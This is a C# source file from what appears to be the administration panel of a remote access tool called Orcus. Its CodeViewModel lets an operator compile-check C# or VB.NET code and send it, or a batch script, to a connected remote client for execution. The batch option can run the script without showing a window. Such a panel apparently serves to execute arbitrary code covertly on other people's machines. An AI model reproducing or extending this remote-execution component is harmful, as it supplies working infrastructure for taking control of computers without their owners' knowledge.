using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Linq;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Orcus.Administration.Commands.Code;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class CodeViewModel : CommandView
    {
        private string _csharpCodeText = Properties.Resources.DefaultCodeCsharp;
        private List<CompilerError> _csharpErrors;
        private RelayCommand _csharpRestoreCodeCommand;
        private RelayCommand _sendBatchCodeCommand;
        private RelayCommand _sendCodeCommand;
        private RelayCommand _sendVisualBasicCodeCommand;
        private string _visualBasicCodeText = Properties.Resources.DefaultCodeVisualBasic;
        private List<CompilerError> _visualBasicErrors;
        private RelayCommand _visualBasicRestoreCodeCommand;

        public override string Name { get; } = (string) Application.Current.Resources["Code"];
        public override Category Category { get; } = Category.Utilities;
        public CodeCommand CodeCommand { get; private set; }

        public List<CompilerError> CsharpErrors
        {
            get { return _csharpErrors; }
            set { SetProperty(value, ref _csharpErrors); }
        }

        public List<CompilerError> VisualBasicErrors
        {
            get { return _visualBasicErrors; }
            set { SetProperty(value, ref _visualBasicErrors); }
        }

        public string VisualBasicCodeText
        {
            get { return _visualBasicCodeText; }
            set
            {
                if (SetProperty(value, ref _visualBasicCodeText))
                {
                    VisualBasicErrors = TestCode(value, false);
                }
            }
        }

        public string CsharpCodeText
        {
            get { return _csharpCodeText; }
            set
            {
                if (SetProperty(value, ref _csharpCodeText))
                {
                    CsharpErrors = TestCode(value, true);
                }
            }
        }

        public RelayCommand CsharpRestoreCodeCommand
        {
            get
            {
                return _csharpRestoreCodeCommand ??
                       (_csharpRestoreCodeCommand =
                           new RelayCommand(parameter => { CsharpCodeText = Properties.Resources.DefaultCodeCsharp; }));
            }
        }

        public RelayCommand VisualBasicRestoreCodeCommand
        {
            get
            {
                return _visualBasicRestoreCodeCommand ??
                       (_visualBasicRestoreCodeCommand =
                           new RelayCommand(
                               parameter => { VisualBasicCodeText = Properties.Resources.DefaultCodeVisualBasic; }));
            }
        }

        public RelayCommand SendCsharpCodeCommand
        {
            get
            {
                return _sendCodeCommand ?? (_sendCodeCommand = new RelayCommand(parameter =>
                {
                    var source = (string) parameter;
                    CodeCommand.SendCsharpCode(source);
                }));
            }
        }

        public RelayCommand SendVisualBasicCodeCommand
        {
            get
            {
                return _sendVisualBasicCodeCommand ?? (_sendVisualBasicCodeCommand = new RelayCommand(parameter =>
                {
                    if (ClientController.Client.Version < 7)
                    {
                        WindowService.ShowMessageBox((string) Application.Current.Resources["ClientUpdateRequired"]); //version7disable
                        return;
                    }
                    var source = (string) parameter;
                    CodeCommand.SendVisualBasicCode(source);
                }));
            }
        }

        public RelayCommand SendBatchCodeCommand
        {
            get
            {
                return _sendBatchCodeCommand ?? (_sendBatchCodeCommand = new RelayCommand(parameter =>
                {
                    var parameters = (object[]) parameter;
                    var code = (string) parameters[0];
                    var createNoWindow = (bool) parameters[1];

                    if (string.IsNullOrWhiteSpace(code))
                        return;

                    CodeCommand.SendBatchCode(code, createNoWindow);
                }));
            }
        }

        private List<CompilerError> TestCode(string source, bool isCsharp)
        {
            var providerOptions = new Dictionary<string, string>
            {
                {"CompilerVersion", "v3.5"}
            };

            var provider = isCsharp
                ? (CodeDomProvider) new CSharpCodeProvider(providerOptions)
                : new VBCodeProvider(providerOptions);

            var compilerParams = new CompilerParameters
            {
                GenerateInMemory = true,
                GenerateExecutable = false
            };
            compilerParams.ReferencedAssemblies.Add("System.dll");
            compilerParams.ReferencedAssemblies.Add("System.Core.dll");
            compilerParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            compilerParams.ReferencedAssemblies.Add("System.Xml.dll");
            compilerParams.ReferencedAssemblies.Add("System.Xml.Linq.dll");

            var results = provider.CompileAssemblyFromSource(compilerParams, source);
            if (!results.Errors.HasErrors)
            {
                object classObject;
                try
                {
                    classObject = results.CompiledAssembly.CreateInstance("Orcus.CodeExecution");
                }
                catch (Exception)
                {
                    classObject = null;
                }

                if (classObject == null)
                {
                    return new List<CompilerError>
                    {
                        new CompilerError("", -1, -1, "ORC1", "Main class \"Orcus.CodeExecution\" not found.")
                    };
                }

                object mainMethod;
                try
                {
                    mainMethod = classObject.GetType().GetMethod("Main");
                }
                catch (Exception)
                {
                    mainMethod = null;
                }

                if (mainMethod == null)
                {
                    return new List<CompilerError>
                    {
                        new CompilerError("", -1, -1, "ORC2", "Entry point \"Main\" not found.")
                    };
                }

                return null;
            }

            return results.Errors.OfType<CompilerError>().ToList();
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            CodeCommand = clientController.Commander.GetCommand<CodeCommand>();
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/Code_16x.png", UriKind.Absolute));
        }
    }
}